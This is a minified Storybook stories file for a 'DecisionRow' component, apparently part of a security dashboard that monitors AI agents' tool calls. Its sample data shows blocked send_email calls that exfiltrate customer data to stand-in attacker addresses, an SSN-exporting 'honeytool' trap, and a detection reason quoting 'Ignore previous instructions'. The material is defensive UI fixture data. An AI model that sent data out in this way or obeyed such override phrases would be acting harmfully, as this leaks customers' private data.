import{j as e}from"./jsx-runtime-DFAAy_2V.js";import{D as r}from"./DecisionRow-DP6BL7Ov.js";import"./index-Bc2G9s8g.js";import"./cn-DOIGBiOF.js";import"./VerdictBadge-C9B2uJkd.js";import"./RiskMeter-DMzAkDNC.js";const R={title:"Components/DecisionRow",component:r,tags:["autodocs"]},s={args:{id:"dec_001",timestamp:"2026-10-18T00:14:22Z",agentId:"support-agent-01",sessionId:"sess_c9842a",step:1,toolName:"read_email",argumentsSummary:'{"email_id": "em_8392"}',action:"allow",risk:.04,latencyMs:12.3}},t={args:{id:"dec_002",timestamp:"2026-10-18T00:14:25Z",agentId:"support-agent-01",sessionId:"sess_c9842a",step:2,toolName:"send_email",argumentsSummary:'{"to": "attacker@evil.example.test", "body": "All customers: [exfil]"}',action:"block",risk:.94,latencyMs:16.8,reasons:[{code:"RULE_INJECTION_OVERRIDE",evidence:"Ignore previous instructions detected"},{code:"SIMILARITY_MATCH",evidence:"Cosine: 0.96 to attack template"}]}},a={args:{id:"dec_003",timestamp:"2026-10-18T00:15:10Z",agentId:"finance-bot-04",sessionId:"sess_f7110e",step:4,toolName:"export_all_customers",argumentsSummary:'{"format": "csv", "include_ssn": true}',action:"kill_session",risk:.99,latencyMs:8.2,reasons:[{code:"HONEYTOOL_TOUCH",evidence:"Critical honeytool trap invoked"}]}},o={render:()=>e.jsxs("div",{className:"border border-line rounded-sm bg-panel max-w-4xl divide-y divide-line",children:[e.jsx(r,{id:"dec_101",timestamp:"2026-10-18T00:12:00Z",agentId:"assistant-1",sessionId:"sess_01",step:0,toolName:"read_webpage",argumentsSummary:'{"url": "https://docs.example.test/api"}',action:"allow",risk:.02,latencyMs:11.4}),e.jsx(r,{id:"dec_102",timestamp:"2026-10-18T00:12:05Z",agentId:"assistant-1",sessionId:"sess_01",step:1,toolName:"search_customers",argumentsSummary:'{"query": "admin_keys"}',action:"sanitize",risk:.24,latencyMs:14.1,reasons:[{code:"PII_KEYWORD",evidence:"Sensitive credential query"}]}),e.jsx(r,{id:"dec_103",timestamp:"2026-10-18T00:12:12Z",agentId:"assistant-1",sessionId:"sess_01",step:2,toolName:"send_email",argumentsSummary:'{"to": "leak@attacker.example.test"}',action:"block",risk:.92,latencyMs:17.5,reasons:[{code:"TAINT_SINK_VIOLATION",evidence:"Untrusted webpage text reached external sink"}]})]})};var i,n,c;s.parameters={...s.parameters,docs:{...(i=s.parameters)==null?void 0:i.docs,source:{originalSource:`{
  args: {
    id: "dec_001",
    timestamp: "2026-10-18T00:14:22Z",
    agentId: "support-agent-01",
    sessionId: "sess_c9842a",
    step: 1,
    toolName: "read_email",
    argumentsSummary: '{"email_id": "em_8392"}',
    action: "allow",
    risk: 0.04,
    latencyMs: 12.3
  }
}`,...(c=(n=s.parameters)==null?void 0:n.docs)==null?void 0:c.source}}};var d,m,l;t.parameters={...t.parameters,docs:{...(d=t.parameters)==null?void 0:d.docs,source:{originalSource:`{
  args: {
    id: "dec_002",
    timestamp: "2026-10-18T00:14:25Z",
    agentId: "support-agent-01",
    sessionId: "sess_c9842a",
    step: 2,
    toolName: "send_email",
    argumentsSummary: '{"to": "attacker@evil.example.test", "body": "All customers: [exfil]"}',
    action: "block",
    risk: 0.94,
    latencyMs: 16.8,
    reasons: [{
      code: "RULE_INJECTION_OVERRIDE",
      evidence: "Ignore previous instructions detected"
    }, {
      code: "SIMILARITY_MATCH",
      evidence: "Cosine: 0.96 to attack template"
    }]
  }
}`,...(l=(m=t.parameters)==null?void 0:m.docs)==null?void 0:l.source}}};var p,u,_;a.parameters={...a.parameters,docs:{...(p=a.parameters)==null?void 0:p.docs,source:{originalSource:`{
  args: {
    id: "dec_003",
    timestamp: "2026-10-18T00:15:10Z",
    agentId: "finance-bot-04",
    sessionId: "sess_f7110e",
    step: 4,
    toolName: "export_all_customers",
    argumentsSummary: '{"format": "csv", "include_ssn": true}',
    action: "kill_session",
    risk: 0.99,
    latencyMs: 8.2,
    reasons: [{
      code: "HONEYTOOL_TOUCH",
      evidence: "Critical honeytool trap invoked"
    }]
  }
}`,...(_=(u=a.parameters)==null?void 0:u.docs)==null?void 0:_.source}}};var I,g,y;o.parameters={...o.parameters,docs:{...(I=o.parameters)==null?void 0:I.docs,source:{originalSource:`{
  render: () => <div className="border border-line rounded-sm bg-panel max-w-4xl divide-y divide-line">\r
      <DecisionRow id="dec_101" timestamp="2026-10-18T00:12:00Z" agentId="assistant-1" sessionId="sess_01" step={0} toolName="read_webpage" argumentsSummary='{"url": "https://docs.example.test/api"}' action="allow" risk={0.02} latencyMs={11.4} />\r
      <DecisionRow id="dec_102" timestamp="2026-10-18T00:12:05Z" agentId="assistant-1" sessionId="sess_01" step={1} toolName="search_customers" argumentsSummary='{"query": "admin_keys"}' action="sanitize" risk={0.24} latencyMs={14.1} reasons={[{
      code: "PII_KEYWORD",
      evidence: "Sensitive credential query"
    }]} />\r
      <DecisionRow id="dec_103" timestamp="2026-10-18T00:12:12Z" agentId="assistant-1" sessionId="sess_01" step={2} toolName="send_email" argumentsSummary='{"to": "leak@attacker.example.test"}' action="block" risk={0.92} latencyMs={17.5} reasons={[{
      code: "TAINT_SINK_VIOLATION",
      evidence: "Untrusted webpage text reached external sink"
    }]} />\r
    </div>
}`,...(y=(g=o.parameters)==null?void 0:g.docs)==null?void 0:y.source}}};const S=["AllowedRow","BlockedInjectionRow","HoneytoolTriggerRow","LiveFeedBatch"];export{s as AllowedRow,t as BlockedInjectionRow,a as HoneytoolTriggerRow,o as LiveFeedBatch,S as __namedExportsOrder,R as default};
